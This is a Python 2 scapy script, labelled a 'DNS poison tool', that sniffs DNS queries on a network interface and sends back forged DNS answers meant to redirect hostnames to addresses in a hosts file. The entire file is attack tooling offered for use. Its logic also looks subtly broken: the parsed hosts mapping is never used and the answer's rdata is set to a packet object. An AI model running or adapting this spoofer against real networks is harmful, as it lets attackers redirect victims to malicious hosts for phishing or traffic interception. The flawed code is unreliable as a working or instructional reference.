from __future__ import with_statement

from os.path import isfile
import sys
import getopt

import scapy
import scapy.main
from scapy.all import *

import binascii

class Poison():
    LOG_LEVEL = 40
    
    def __init__(self, interface, hosts):        
        scapy.config.conf.logLevel = self.LOG_LEVEL
        
        self.interface = interface
        self.ip = self.__get_ip__(self.interface)
        
        # build the listen filter
        self.filter = "udp dst port 53 && (ip[16:4] = 0x{0}) && ((udp[10] & 0xf0) >> 7 == 0x0)".format(self.ip['hex'])
        self.hosts = self.__parse_hosts__(hosts)
        
    def __get_ip__(self, i):
        for r in scapy.config.conf.route.routes:
            if r[3] == i:
                return {'addr' : r[4], 'hex' : binascii.hexlify(socket.inet_aton(r[4]))}
                
        return None
    
    def __parse_hosts__(self, fname):
        entries = {}
        with open(fname, 'r') as f:
            for line in f.readlines():
                if line.startswith("#") or line.startswith("\n"):
                    continue
                (ip, name) = (line.rstrip('\n').split())[0:2]
                entries[name] = ip
                
        return entries
    
    def __sniff__(self):
        sniff(filter  = self.filter, \
              prn     = self.__process_packets__, \
              store   = 0, \
              iface   = self.interface, \
             )
        
    def __process_packets__(self, p):
        eth_pkt = p.getlayer(Ether)
        ip_pkt  = p.getlayer(IP)
        dns_pkt = p.getlayer(DNS)
        
        # build up the response packet
        response = Ether()/IP(dst=ip_pkt.src, src=ip_pkt.dst)/UDP(dport=ip_pkt.sport, sport=ip_pkt.dport)
        
        # DNS response
        d_resp = DNS(id = dns_pkt.id, qr = 1, rd = dns_pkt.rd, qd = dns_pkt.qd)
        
        answered = False
        
        d_resp.an = DNSRR(rrname=dns_pkt.qd.qname, rdata=ip_pkt)
        answered = True
        
        response /= d_resp
        
        send(response, verbose=0)
    
    def poison(self):
        self.__sniff__()

def usage():
    print >> sys.stderr, """
{0} - scapy DNS poison tool
usage is: {0} -i network_interface -f path_to_hosts_file [-h]
    """.format(sys.argv[0])

def process_args(argv):
    interface = None
    hosts     = None
    
    try:
        opts, args = getopt.getopt(argv, 'hi:f:c:')

        for opt, arg in opts:
            if opt == '-h':
                usage()
                sys.exit(2)
            elif opt == '-i':
                interface = arg
            elif opt== '-f':
                hosts = arg
                if not isfile(hosts):
                    raise IOError('{0}: directory or file does not exist'.format(hosts))

    except getopt.GetoptError:
        print >> sys.stderr, "invalid argument"
        usage()
        sys.exit(1)
    except IOError, e:
        print >> sys.stderr, e
        usage()
        sys.exit(3)

    return (interface, hosts)
        
if __name__ == "__main__":
    (interface, hosts) = process_args(sys.argv[1:])
    if interface is None:
        interface = scapy.config.conf.iface
        
    if hosts is None:
        hosts = '/etc/hosts'
        
    p = Poison(interface, hosts)
    p.poison()
    